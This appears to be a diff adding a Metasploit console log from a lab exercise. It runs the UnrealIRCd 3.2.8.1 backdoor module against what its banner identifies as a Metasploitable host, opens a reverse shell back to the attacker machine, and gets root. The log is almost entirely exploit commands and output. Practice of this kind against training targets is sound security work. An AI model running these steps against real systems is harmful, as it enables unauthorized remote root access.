@@ -1,0 +1,56 @@
+msf5 exploit(linux/local/udev_netlink) > search UnrealIRCd
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
+
+
+msf5 exploit(linux/local/udev_netlink) > 
+msf5 exploit(linux/local/udev_netlink) > 
+msf5 exploit(linux/local/udev_netlink) > use exploit/unix/irc/unreal_ircd_3281_backdoor 
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > 
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > 
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options 
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.1.31     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   6667             yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+
+[*] Started reverse TCP double handler on 192.168.1.14:4444 
+[*] 192.168.1.31:6667 - Connected to 192.168.1.31:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+[*] 192.168.1.31:6667 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo 62SlhxynbbEV75NA;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "62SlhxynbbEV75NA\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 6 opened (192.168.1.14:4444 -> 192.168.1.31:55203) at 2020-05-10 23:31:15 +0200
+
+id
+uid=0(root) gid=0(root)
+
+
+
+
